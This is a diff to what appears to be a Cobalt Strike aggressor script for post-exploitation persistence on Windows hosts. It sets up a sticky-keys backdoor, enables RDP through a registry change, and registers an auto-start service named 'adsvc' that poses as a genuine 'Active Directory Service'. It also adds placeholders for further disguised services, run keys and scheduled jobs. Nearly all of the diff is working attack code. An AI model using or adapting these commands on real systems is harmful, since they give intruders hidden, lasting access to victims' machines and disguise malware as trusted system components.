@@ -11,6 +11,25 @@
 # https://room362.com/post/2012/2012-05-24-sticky-keys-and-utilman-against-nla/
 ########################################
 
+
+## variables
+
+$service1name = "adsvc";
+$service1diplay = "Active Directory Service";
+$service1descript = "Provides authentication and policy management for computers joined to domain.";
+$service2name = "";
+$service2display = "";
+$service2descript = "";
+$runkey1 = "";
+$runkey2 = "";
+$schjob1name = "";
+$schjob1run = "";
+$schjob2name = "";
+$schjob2run = "";
+
+
+
+
 sub stickykeys {
     binput($1, 'Running setup for StickyKeys');
     bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
@@ -36,7 +55,6 @@ sub persist_adsvc {
         bshell($1, 'sc delete adsvc');
         bshell($1, 'sc create adsvc binPath= "C:\windows\system32\adsvc.exe" start= auto DisplayName= "Active Directory Service"');
         bshell($1, 'sc description adsvc "Provides authentication and policy management for computers joined to domain."');
-        bshell($1, 'sc start adsvc');
 
     }
     else {
